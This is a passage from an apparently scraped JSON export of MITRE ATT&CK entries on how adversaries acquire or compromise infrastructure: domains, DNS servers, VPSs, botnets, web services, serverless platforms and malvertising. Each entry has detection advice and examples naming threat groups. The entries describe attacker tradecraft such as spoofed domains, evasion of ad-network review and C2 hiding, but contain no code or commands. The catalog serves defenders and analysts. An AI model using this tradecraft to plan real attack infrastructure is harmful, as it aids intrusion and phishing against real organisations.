      "APT32has set up and operated websites to gather information and deliver malware.[21]",
      "APT38has created fake domains to imitate legitimate venture capital or bank domains.[22]",
      "APT42has registered domains, several of which masqueraded as news outlets and login services, for use in operations.[23][24]",
      "BITTERhas registered a variety of domains to host malicious payloads and for C2.[25]",
      "ForC0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.[26]",
      "ForC0011,Transparent Triberegistered domains likely designed to appear relevant to student targets in India.[27]",
      "ForC0021, the threat actors registered domains for use in C2.[28]",
      "ForC0026, the threat actors re-registered expired C2 domains previously used forANDROMEDAmalware.[29]",
      "ForCostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains.[30]",
      "CURIUMcreated domains to facilitate strategic website compromise and credential capture activities.[31]",
      "DarkGatecommand and control includes hard-coded domains in the malware chosen to masquerade as legitimate services such as Akamai CDN or Amazon Web Services.[32]",
      "Dragonflyhas registered domains for targeting intended victims.[33]",
      "Earth Luscahas registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks.[34]",
      "EXOTIC LILYhas registered domains to spoof targeted organizations by changing the top-level domain (TLD) to \".us\", \".co\" or \".biz\".[35]",
      "Ferocious Kittenhas acquired domains imitating legitimate sites.[36]",
      "FIN7has registered look-alike domains for use in phishing campaigns.[37]",
      "ForFunnyDream, the threat actors registered a variety of domains.[38]",
      "Gamaredon Grouphas registered multiple domains to facilitate payload staging and C2.[39][40]",
      "HEXANEhas registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization.[41][42][43]",
      "DuringIndian Critical Infrastructure Intrusions,RedEchoregistered domains spoofing Indian critical infrastructure entities.[44]",
      "IndigoZebrahas established domains, some of which were designed to look like official government domains, for their operations.[45]",
      "Kimsukyhas registered domains to spoof targeted organizations and trusted third parties including search engines, web platforms, and cryptocurrency exchanges.[46][47][48][49][50][51][52][53]",
      "Lazarus Grouphas acquired domains related to their campaigns to act as distribution points and C2 channels.[54][55]",
      "LazyScripterhas used dynamic DNS providers to create legitimate-looking subdomains for C2.[56]",
      "Leviathanhas established domains that impersonate legitimate entities to use for targeting efforts.[57][58]",
      "Magic Houndhas registered fraudulent domains such as \"mail-newyorker.com\" and \"news12.com.recover-session-service.site\" to target specific victims with phishing attacks.[59]",
      "menuPasshas registered malicious domains for use in intrusion campaigns.[60][61]",
      "Moonstone Sleetregistered domains to develop effective personas for fake companies used in phishing activity.[62]",
      "Mustang Pandahave acquired C2 domains prior to operations.[63][64][65]",
      "OilRighas set up fake VPN portals, conference sign ups, and job application websites to target victims.[66]",
      "DuringOperation Dream Job,Lazarus Groupregistered a domain name identical to that of a compromised company as part of their BEC effort.[67]",
      "ForOperation Dust Storm, the threat actors established domains as part of their operational infrastructure.[68]",
      "ForOperation Ghost,APT29registered domains for use in C2 including some crafted to appear as existing legitimate domains.[69]",
      "DuringOperation Honeybee, threat actors registered domains for C2.[70]",
      "ForOperation Spalax, the threat actors registered hundreds of domains using Duck DNS and DNS Exit.[71]",
      "Raspberry Robinuses newly-registered domains containing only a few characters for command and controll purposes, such as \"v0[.]cx\".[72]",
      "Mustang Pandaregistered adversary-controlled domains duringRedDelta Modified PlugX Infection Chain Operationsthat were re-registrations of expired domains.[73]",
      "RedEchohas registered domains spoofing Indian critical infrastructure entities.[44]",
      "Sandworm Teamhas registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure.[74][75]",
      "Sea Turtleregistered domains for authoritative name servers used in DNS hijacking activity and for command and control servers.[76][77]",
      "Silent Librarianhas acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ.[78][79][80][81][82][83]",
      "For theSolarWinds Compromise,APT29acquired C2 domains, sometimes through resellers.[84][85]",
      "Star Blizzardhas registered domains using randomized words and with names resembling legitimate organizations.[86][87]",
      "Storm-1811has created domains for use with RMM tools.[88]",
      "TA2541has registered domains often containing the keywords \"kimjoy,\" \"h0pe,\" and \"grace,\" using domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom.[89][90]",
      "TA505has registered domains to impersonate services such as Dropbox to distribute malware.[91]",
      "TeamTNThas obtained domains to host their payloads.[92]",
      "Threat Group-3390has registered domains for C2.[93]",
      "Transparent Tribehas registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.[94][95]",
      "Winnti Grouphas registered domains for C2 that mimicked sites of their intended targets.[96]",
      "Winter Vivernregistered domains mimicking other entities throughout various campaigns.[97]",
      "XLoadercan utilize hardcoded command and control domain configurations created by the XLoader authors. These are designed to mimic domain registrars and hosting service providers such as Hostinger and Namecheap.[98]",
      "ZIRCONIUMhas purchased domains for use in targeted campaigns.[99]"
    ]
  },
  "T1583.002": {
    "Name": "Acquire Infrastructure:DNS Server",
    "Description": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex:Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.[1]",
    "Detects": [],
    "Procedure Examples": [
      "Axiomhas acquired dynamic DNS services for use in the targeting of intended victims.[2]",
      "HEXANEhas set up custom DNS servers to send commands to compromised hosts via TXT records.[3]",
      "Sea Turtlebuilt adversary-in-the-middle DNS servers to impersonate legitimate services that were later used to capture credentials.[4][5]"
    ]
  },
  "T1583.003": {
    "Name": "Acquire Infrastructure:Virtual Private Server",
    "Description": "Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.[1]",
    "Detects": [
      "Once adversaries have provisioned a VPS (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[21][22][23]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "APT28hosted phishing domains on free services for brief periods of time during campaigns.[2]",
      "APT42has used anonymized infrastructure and Virtual Private Servers (VPSs) to interact with the victim’s environment.[3][4]",
      "ArcaneDoorincluded the use of dedicated, adversary-controlled virtual private servers for command and control.[5]",
      "Axiomhas used VPS hosting providers in targeting of intended victims.[6]",
      "BlackBytestaged encryption keys on virtual private servers operated by the adversary.[7]",
      "During theC0032campaign,TEMP.Velesused Virtual Private Server (VPS) infrastructure.[8]",
      "CURIUMcreated virtual private server instances to facilitate use of malicious domains and other items.[9]",
      "Dragonflyhas acquired VPS infrastructure for use in malicious campaigns.[10]",
      "Ember Bearhas used virtual private servers (VPSs) to host tools, perform reconnaissance, exploit victim infrastructure, and as a destination for data exfiltration.[11]",
      "FLORAHOX Activityhas used acquired Virtual Private Servers as control systems for the ORB network.[12]",
      "Gamaredon Grouphas used VPS hosting providers for infrastructure outside of Russia.[13]",
      "HAFNIUMhas operated from leased virtual private servers (VPS) in the United States.[14]",
      "During theJ-magic Campaign, threat actors acquired VPS for use in C2.[15]",
      "KV Botnet Activityused acquired Virtual Private Servers as control systems for devices infected with KV Botnet malware.[16]",
      "LAPSUS$has used VPS hosting providers for infrastructure.[17]",
      "Moonstone Sleetregistered virtual private servers to host payloads for download.[18]",
      "Sea Turtlecreated adversary-in-the-middle servers to impersonate legitimate services and enable credential capture.[19]",
      "SPACEHOP Activityhas used acquired Virtual Private Servers as control systems for devices within the ORB network.[12]",
      "Winter Vivernused adversary-owned and -controlled servers to host web vulnerability scanning applications.[20]"
    ]
  },
  "T1583.004": {
    "Name": "Acquire Infrastructure:Server",
    "Description": "Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations inDrive-by Compromise, enablingPhishingoperations, or facilitatingCommand and Control. Instead of compromising a third-partyServeror renting aVirtual Private Server, adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.[1][2]Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.[3]",
    "Detects": [
      "Once adversaries have provisioned a server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[14][15][16]",
      "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "CURIUMhas created dedicated servers for command and control and exfiltration purposes.[4]",
      "Earth Luscahas acquired multiple servers for some of their operations, using each server for a different role.[5]",
      "GALLIUMhas used Taiwan-based servers that appear to be exclusive toGALLIUM.[6]",
      "Kimsukyhas purchased hosting servers with virtual currency and prepaid cards.[7]",
      "Mustard Tempesthas acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months.[8]",
      "DuringNight Dragon, threat actors purchased hosted services to use for C2.[9]",
      "DuringOperation Dream Job,Lazarus Groupacquired servers to host their malicious tools.[10]",
      "ForOperation Honeybee, at least one identified persona was used to register for a free account for a control server.[11]",
      "ForOperation Wocao, the threat actors purchased servers with Bitcoin to use during the operation.[12]",
      "Sandworm Teamhas leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.[13]"
    ]
  },
  "T1583.005": {
    "Name": "Acquire Infrastructure:Botnet",
    "Description": "Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.[1]Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service.Internet-facing edge devices and related network appliances that are end-of-life (EOL) and unsupported by their manufacturers are commonly acquired for botnet activities. Adversaries may lease operational relay box (ORB) networks – consisting of virtual private servers (VPS), small office/home office (SOHO) routers, or Internet of Things (IoT) devices – to serve as a botnet.[2]With a botnet at their disposal, adversaries may perform follow-on activity such as large-scalePhishingor Distributed Denial of Service (DDoS).[3][4][5][6]Acquired botnets may also be used to support Command and Control activity, such asHide Infrastructurethrough an establishedProxynetwork.",
    "Detects": [],
    "Procedure Examples": [
      "APT5has acquired a network of compromised systems – specifically an ORB (operational relay box) network – for follow on activities.[2]",
      "HAFNIUMhas incorporated leased devices into covert networks to obfuscate communications.[7]",
      "Ke3changhas utilized an ORB (operational relay box) network for reconnaissance and vulnerability exploitation.[2]"
    ]
  },
  "T1583.006": {
    "Name": "Acquire Infrastructure:Web Services",
    "Description": "Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service),Exfiltration Over Web Service, orPhishing. Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.[1][2]By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
    "Detects": [
      "Once adversaries leverage the web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.[30]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control (Web Service) orExfiltration Over Web Service."
    ],
    "Procedure Examples": [
      "APT17has created profile pages in Microsoft TechNet that were used as C2 infrastructure.[3]",
      "APT28has used newly-created Blogspot pages for credential harvesting operations.[4]",
      "APT29has registered algorithmically generated Twitter handles that are used for C2 by malware, such asHAMMERTOSS.APT29has also used legitimate web services such as Dropbox and Constant Contact in their operations.[1][5]",
      "APT32has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads.[6]",
      "ArcaneDoorincluded the use of OpenConnect VPN Server instances for conducting actions on victim devices.[7]",
      "Confuciushas obtained cloud storage service accounts to host stolen data.[8]",
      "Earth Luscahas established GitHub accounts to host their malware.[9]",
      "FIN7has set up Amazon S3 buckets to host trojanized digital products.[10]",
      "HAFNIUMhas acquired web services for use in C2 and exfiltration.[11]",
      "IndigoZebracreated Dropbox accounts for their operations.[12][13]",
      "Kimsukyhas hosted content used for targeting efforts via web services such as Blogspot.[14]",
      "Lazarus Grouphas hosted malicious downloads on Github.[15]",
      "LazyScripterhas established GitHub accounts to host its toolsets.[16]",
      "Magic Houndhas acquired Amazon S3 buckets to use in C2.[17]",
      "MuddyWaterhas used file sharing services including OneHub, Sync, and TeraBox to distribute tools.[18][19][20]",
      "DuringOperation Dream Job,Lazarus Groupused file hosting services like DropBox and OneDrive.[21]",
      "ForOperation Sharpshooter, the threat actors used Dropbox to host lure documents and their first-stage downloader.[22]",
      "POLONIUMhas created and used legitimate Microsoft OneDrive accounts for their operations.[23]",
      "Saint Bearhas leveraged the Discord content delivery network to host malicious content for retrieval during initial access operations.[24]",
      "TA2541has hosted malicious files on various platforms including Google Drive, OneDrive, Discord, PasteText, ShareText, and GitHub.[25]",
      "TA578has used Google Firebase to host malicious scripts.[26]",
      "Turlahas created web accounts including Dropbox and GitHub for C2 and document exfiltration.[27]",
      "ZIRCONIUMhas used GitHub to host malware linked in spearphishing e-mails.[28][29]"
    ]
  },
  "T1583.007": {
    "Name": "Acquire Infrastructure:Serverless",
    "Description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or toProxytraffic to an adversary-owned command and control server.[1][2][3]As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier toHide Infrastructure.[4][1]",
    "Detects": [
      "Once adversaries leverage serverless functions as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.[6]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle."
    ],
    "Procedure Examples": [
      "APT41 DUSTused infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control.[5]"
    ]
  },
  "T1583.008": {
    "Name": "Acquire Infrastructure:Malvertising",
    "Description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.[1]Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites.Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.[2][3]Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.[4]Malvertising may be used to supportDrive-by TargetandDrive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.[5]Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.[2]Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.[1]",
    "Detects": [
      "If infrastructure or patterns in the malicious web content related to malvertising have been previously identified, internet scanning may uncover when an adversary has staged malicious web content. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such asDrive-by CompromiseorExploitation for Client Execution."
    ],
    "Procedure Examples": [
      "Mustard Tempesthas posted false advertisements including for software packages and browser updates in order to distribute malware.[6]",
      "Raspberry Robinvariants have been delivered via malicious advertising items that, when interacted with, download a malicious archive file containing the initial payload, hosted on services such as Discord.[7]"
    ]
  },
  "T1584": {
    "Name": "Compromise Infrastructure",
    "Description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.[1][2][3][4]Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction withDigital Certificates) to further blend in and support staged information gathering and/orPhishingcampaigns.[5]Adversaries may also compromise numerous machines to supportProxyand/or proxyware services or to form a botnet.[6][7]Additionally, adversaries may compromise infrastructure residing in close proximity to a target in order to gainInitial AccessviaWi-Fi Networks.[8]By using compromised infrastructure, adversaries may enable follow-on malicious operations. Prior to targeting, adversaries may also compromise the infrastructure of other adversaries.[9]",
    "Detects": [
      "Monitor for queried domain name system (DNS) registry data that may compromise third-party infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.",
      "Monitor for logged domain name system (DNS) data that may compromise third-party infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Once adversaries have provisioned compromised infrastructure (ex: a server for use in command and control), internet scans may help proactively discover compromised infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[11][12][13]",
      "Monitor for contextual data about an Internet-facing resource gathered from a scan, such as running services or ports that may compromise third-party infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "DuringAPT28 Nearest Neighbor Campaign,APT28compromised third-party infrastructure in physical proximity to targets of interest for follow-on activities.[8]",
      "Indian Critical Infrastructure Intrusionsincluded the use of compromised infrastructure, such as DVR and IP camera devices, for command and control purposes inShadowPadactivity.[10]"
    ]
  },
  "T1584.001": {
    "Name": "Compromise Infrastructure:Domains",
    "Description": "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.[1]Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).[2]Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.[3]Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.[4]",
    "Detects": [
      "Monitor for queried domain name system (DNS) registry data that may hijack domains and/or subdomains that can be used during targeting. In some cases, abnormal subdomain IP addresses (such as those originating in a different country from the root domain) may indicate a malicious subdomain.[4]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.",
      "Monitor for logged domain name system (DNS) registry data that may hijack domains and/or subdomains that can be used during targeting.  In some cases, abnormal subdomain IP addresses (such as those originating in a different country from the root domain) may indicate a malicious subdomain.[4]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "APT1hijacked FQDNs associated with legitimate websites hosted by hop points.[5]",
      "DuringC0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.[6]",
      "ForC0021, the threat actors used legitimate but compromised domains to host malicious payloads.[7]",
      "Gootloaderhas used compromised legitimate domains to as a delivery network for malicious payloads.[8]",
      "Kimsukyhas compromised legitimate sites and used them to distribute malware.[9][10][11]",
      "Magic Houndhas used compromised domains to host links targeted to specific phishing victims.[12][13][14][15]",
      "Mustard Tempestoperates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page.[16][17][18][19]",
      "ForOperation Dream Job,Lazarus Groupcompromised domains in Italy and other countries for their C2 infrastructure.[20][21]",
      "SideCopyhas compromised domains for some of their infrastructure, including for C2 and staging malware.[22]",
      "For theSolarWinds Compromise,APT29compromised domains to use for C2.[23]",
      "Transparent Tribehas compromised domains for use in targeted malicious campaigns.[24]"
    ]
  },
  "T1584.002": {
    "Name": "Compromise Infrastructure:DNS Server",
    "Description": "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex:Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.[1][2]Additionally, adversaries may leverage such control in conjunction withDigital Certificatesto redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.[2][3]Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.[4][5]",
    "Detects": [
      "Monitor for queried domain name system (DNS) registry data that may compromise third-party DNS servers that can be used during targeting. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Monitor for logged domain name system (DNS) registry data that may compromise third-party DNS servers that can be used during targeting. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "LAPSUS$has reconfigured a victim's DNS records to actor-controlled domains and websites.[6]",
      "Sea Turtlemodified Name Server (NS) items to refer toSea Turtle-controlled DNS servers to provide responses for all DNS lookups.[7][8]"
    ]
  },
  "T1584.003": {
    "Name": "Compromise Infrastructure:Virtual Private Server",
    "Description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.[1]Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
    "Detects": [
      "Once adversaries have provisioned software on a compromised VPS (ex: for use as a command and control server), internet scans may reveal VPSs that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[4][5][6]",
      "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "DuringOperation MidnightEclipse, threat actors abused Virtual Private Servers to store malicious files.[2]",
      "Turlahas used the VPS infrastructure of compromised Iranian threat actors.[1]",
      "Volt Typhoonhas compromised Virtual Private Servers (VPS) to proxy C2 traffic.[3]"
    ]
  },
  "T1584.004": {
    "Name": "Compromise Infrastructure:Server",
    "Description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.[1]Instead of purchasing aServerorVirtual Private Server, adversaries may compromise third-party servers in support of operations.Adversaries may also compromise web servers to support watering hole operations, as inDrive-by Compromise, or email servers to supportPhishingoperations.",
    "Detects": [
      "Once adversaries have provisioned software on a compromised server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[21][22][23]",
      "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "APT16has compromised otherwise legitimate sites as staging servers for second-stage payloads.[2]",
      "Daggerflycompromised web servers hosting updates for software as part of a supply chain intrusion.[3]",
      "Dragonflyhas compromised legitimate websites to host C2 and malware modules.[4]",
      "Earth Luscahas used compromised web servers as part of their operational infrastructure.[1]",
      "Indrik Spiderhas served fake updates via legitimate websites that have been compromised.[5]",
      "DuringJuicy Mix,OilRigcompromised an Israeli job portal to use for a C2 server.[6]",
      "Lazarus Grouphas compromised servers to stage malicious tools.[7]",
      "Leviathanhas used compromised legitimate websites as command and control nodes for operations.[8]",
      "DuringNight Dragon, threat actors compromised web servers to use for C2.[9]",
      "ForOperation Dream Job,Lazarus Groupcompromised servers to host their malicious tools.[10][11][12]",
      "ForOperation Sharpshooter, the threat actors compromised a server they used as part of the campaign's infrastructure.[13]",
      "DuringOuter Space,OilRigcompromised an Israeli human resources site to use as a C2 server.[6]",
      "Sandworm Teamcompromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns.[14][15]",
      "Turlahas used compromised servers as infrastructure.[16][17][18]",
      "Volt Typhoonhas used compromised Paessler Router Traffic Grapher (PRTG) servers from other organizations for C2.[19][20]"
    ]
  },
  "T1584.005": {
    "Name": "Compromise Infrastructure:Botnet",
    "Description": "Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.[1]Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.[2]Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.[3]With a botnet at their disposal, adversaries may perform follow-on activity such as large-scalePhishingor Distributed Denial of Service (DDoS).",
    "Detects": [],
    "Procedure Examples": [
      "Axiomhas used large groups of compromised machines for use as proxy nodes.[4]",
      "HAFNIUMhas used compromised devices in covert networks to obfuscate communications.[5]",
      "Sandworm Teamhas used a large-scale botnet to target Small Office/Home Office (SOHO) network devices.[6]",
      "Volt TyphoonVolt Typhoon has used compromised Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support operations.[7]"
    ]
  },
  "T1584.006": {
    "Name": "Compromise Infrastructure:Web Services",
    "Description": "Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service),Exfiltration Over Web Service, orPhishing.[1]Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",
    "Detects": [
      "Once adversaries leverage the abused web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.[7]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and ControlWeb ServiceorExfiltration Over Web Service."
    ],
    "Procedure Examples": [
      "CURIUMhas compromised legitimate websites to enable strategic website compromise attacks.[2]",
      "Earth Luscahas compromised Google Drive repositories.[3]",
      "Gootloadercan insert malicious scripts to compromise vulnerable content management systems (CMS).[4]",
      "DuringOperation MidnightEclipse, threat actors abused compromised AWS buckets to store files.[5]",
      "Turlahas frequently used compromised WordPress sites for C2 infrastructure.[1]",
      "Winter Vivernhas used compromised WordPress sites to host malicious payloads for download.[6]"
    ]
  },
  "T1584.007": {
    "Name": "Compromise Infrastructure:Serverless",
    "Description": "Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or toProxytraffic to an adversary-owned command and control server.[1][2][3]As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier toHide Infrastructure.[4][1]",
    "Detects": [
      "Once adversaries leverage serverless functions as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.[5]Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle."
    ],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
    ]
  },
  "T1584.008": {
    "Name": "Compromise Infrastructure:Network Devices",
